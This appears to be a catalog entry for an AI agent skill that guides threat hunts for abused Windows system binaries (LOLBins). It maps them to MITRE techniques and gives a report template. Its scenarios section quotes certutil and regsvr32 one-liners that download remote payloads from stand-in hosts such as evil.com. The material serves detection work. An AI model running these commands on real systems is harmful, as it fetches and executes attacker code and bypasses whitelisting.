---
slug: mukul975-anthropic-cybersecurity-skills-skills-hunting-for-living-off-the-land-binaries
name: hunting-for-living-off-the-land-binaries
tagline: Agent skill from mukul975/Anthropic-Cybersecurity-Skills
summary: Agent skill from mukul975/Anthropic-Cybersecurity-Skills
categories:
  - security-auth
tags:
  - ai-agents
  - claude-code
  - cloud-security
  - cybersecurity
status: active
quality_percentile: 59
selection_reason: quality_percentile
first_seen: 2026-10-19
last_updated: 2026-10-26T07:46:02.721Z
source:
  kind: github_repo
  repo: mukul975/Anthropic-Cybersecurity-Skills
  subpath: skills/hunting-for-living-off-the-land-binaries
  official_vendor: false
  license: Apache-2.0
signals:
  stars: 35031
  last_commit: 2026-08-31T04:32:44Z
  stars_delta_7d: 353
  stars_growth_pct: 1
  trending_score: 356.59
  velocity_source: snapshot_delta
  sparkline_4w:
    - 33900
    - 34367
    - 34678
    - 35031
language: en
needs_keys: false
prerequisites: []
readme_source:
  repo: mukul975/Anthropic-Cybersecurity-Skills
  path: skills/hunting-for-living-off-the-land-binaries/SKILL.md
  branch: main
  fetched_at: 2026-10-26T07:43:39.357Z
  truncated: false
type: agent_skill
skill:
  skill_name: hunting-for-living-off-the-land-binaries
  description: Agent skill from mukul975/Anthropic-Cybersecurity-Skills
  folder_path: skills/hunting-for-living-off-the-land-binaries
  extra_files:
    - LICENSE
    - assets/template.md
    - references/api-reference.md
    - references/standards.md
    - references/workflows.md
    - scripts/agent.py
    - scripts/process.py
  pack_total_skills: 818
  is_pack_primary: false
  clients:
    - claude-code
    - codex
    - antigravity
  pack_slug: mukul975-anthropic-cybersecurity-skills
---

# Hunting for Living-off-the-Land Binaries (LOLBins)
## When to Use

- When investigating fileless malware campaigns that bypass traditional AV
- During proactive threat hunts targeting defense evasion techniques
- When EDR alerts fire on legitimate binaries executing unusual child processes
- After threat intelligence reports indicate LOLBin abuse in active campaigns
- During red team/purple team exercises validating detection coverage for T1218

## Prerequisites

- Access to EDR telemetry (CrowdStrike, Microsoft Defender for Endpoint, SentinelOne)
- SIEM with process creation logs (Sysmon Event ID 1, Windows Security 4688)
- Familiarity with LOLBAS Project (lolbas-project.github.io) reference list
- PowerShell command-line logging enabled (Module Logging, Script Block Logging)
- Network proxy or firewall logs for correlating outbound connections

## Workflow

1. **Define Hunt Hypothesis**: Formulate a hypothesis based on threat intel (e.g., "Adversaries are using certutil.exe to download second-stage payloads from external domains").
2. **Identify Target LOLBins**: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).
3. **Collect Process Telemetry**: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.
4. **Baseline Normal Behavior**: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.
5. **Identify Anomalies**: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.
6. **Correlate and Enrich**: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.
7. **Document and Report**: Record findings, update detection rules, and create IOC lists for identified malicious LOLBin usage.

## Key Concepts

| Concept | Description |
|---------|-------------|
| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.002 | Control Panel (control.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 |
| T1218.011 | Rundll32 |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| Proxy Execution | Using trusted binaries to execute untrusted code |
| Fileless Attack | Attack that operates primarily in memory without dropping files |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CrowdStrike Falcon | EDR telemetry and process tree analysis |
| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
| Splunk | SIEM log aggregation and SPL queries |
| Elastic Security | Detection rules and timeline investigation |
| Sysmon | Detailed process creation and network logging |
| LOLBAS Project | Reference database of LOLBin capabilities |
| Sigma Rules | Generic detection rule format for LOLBins |
| Velociraptor | Endpoint forensic collection and hunting |

## Common Scenarios

1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Hypothesis: [Stated hypothesis]
LOLBins Investigated: [List of binaries]
Time Range: [Start] - [End]
Data Sources: [EDR, Sysmon, SIEM]
Findings:
  - [Finding 1 with evidence]
  - [Finding 2 with evidence]
Anomalies Detected: [Count]
True Positives: [Count]
False Positives: [Count]
IOCs Identified: [List]
Detection Rules Created/Updated: [List]
Recommendations: [Next steps]
```
